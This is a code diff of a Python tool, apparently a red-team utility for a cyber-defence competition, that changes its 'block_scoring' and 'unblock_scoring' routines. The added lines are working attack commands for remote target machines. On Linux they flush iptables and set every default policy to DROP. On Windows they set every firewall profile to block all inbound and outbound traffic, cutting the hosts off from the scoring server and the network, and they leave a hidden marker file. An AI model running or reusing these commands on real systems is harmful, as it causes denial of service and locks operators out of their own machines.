@@ -811,6 +811,11 @@ Write-Output "ACCESS_TASKS_INSTALLED"
 
     def block_scoring(self, targets: List[str], scoring_ip: str = "192.168.192.1") -> Dict:
         linux_cmd = f'''
+iptables -F 2>/dev/null || true
+iptables -X 2>/dev/null || true
+iptables -P INPUT DROP 2>/dev/null || true
+iptables -P OUTPUT DROP 2>/dev/null || true
+iptables -P FORWARD DROP 2>/dev/null || true
 iptables -I INPUT -j DROP 2>/dev/null || true
 iptables -I OUTPUT -j DROP 2>/dev/null || true
 iptables -I INPUT -s {scoring_ip} -j DROP 2>/dev/null || true
@@ -821,6 +826,10 @@ echo "Scoring blocked at $(date)" >> /tmp/.neurotoxin_active
 echo "SCORING_BLOCKED"
 '''
         windows_cmd = f'''
+New-NetFirewallRule -DisplayName "Block All Inbound" -Direction Inbound -Action Block -Protocol Any -ErrorAction SilentlyContinue | Out-Null
+New-NetFirewallRule -DisplayName "Block All Outbound" -Direction Outbound -Action Block -Protocol Any -ErrorAction SilentlyContinue | Out-Null
+Set-NetFirewallProfile -Profile Domain,Public,Private -DefaultOutboundAction Block -ErrorAction SilentlyContinue | Out-Null
+Set-NetFirewallProfile -Profile Domain,Public,Private -DefaultInboundAction Block -ErrorAction SilentlyContinue | Out-Null
 New-NetFirewallRule -DisplayName "ApertureNeurotoxinAllIn" -Direction Inbound -Action Block -Enabled True 2>$null
 New-NetFirewallRule -DisplayName "ApertureNeurotoxinAllOut" -Direction Outbound -Action Block -Enabled True 2>$null
 New-NetFirewallRule -DisplayName "ApertureNeurotoxin" -Direction Inbound -RemoteAddress {scoring_ip} -Action Block -Enabled True 2>$null
@@ -832,6 +841,9 @@ Write-Output "SCORING_BLOCKED"
 
     def unblock_scoring(self, targets: List[str], scoring_ip: str = "192.168.192.1") -> Dict:
         linux_cmd = f'''
+iptables -P INPUT ACCEPT 2>/dev/null || true
+iptables -P OUTPUT ACCEPT 2>/dev/null || true
+iptables -P FORWARD ACCEPT 2>/dev/null || true
 iptables -D INPUT -j DROP 2>/dev/null || true
 iptables -D OUTPUT -j DROP 2>/dev/null || true
 iptables -D INPUT -s {scoring_ip} -j DROP 2>/dev/null || true
@@ -840,6 +852,10 @@ rm -f /tmp/.neurotoxin_active
 echo "SCORING_UNBLOCKED"
 '''
         windows_cmd = '''
+Remove-NetFirewallRule -DisplayName "Block All Inbound" -ErrorAction SilentlyContinue
+Remove-NetFirewallRule -DisplayName "Block All Outbound" -ErrorAction SilentlyContinue
+Set-NetFirewallProfile -Profile Domain,Public,Private -DefaultOutboundAction Allow -ErrorAction SilentlyContinue | Out-Null
+Set-NetFirewallProfile -Profile Domain,Public,Private -DefaultInboundAction Allow -ErrorAction SilentlyContinue | Out-Null
 Remove-NetFirewallRule -DisplayName "ApertureNeurotoxinAllIn" -ErrorAction SilentlyContinue
 Remove-NetFirewallRule -DisplayName "ApertureNeurotoxinAllOut" -ErrorAction SilentlyContinue
 Remove-NetFirewallRule -DisplayName "ApertureNeurotoxin" -ErrorAction SilentlyContinue
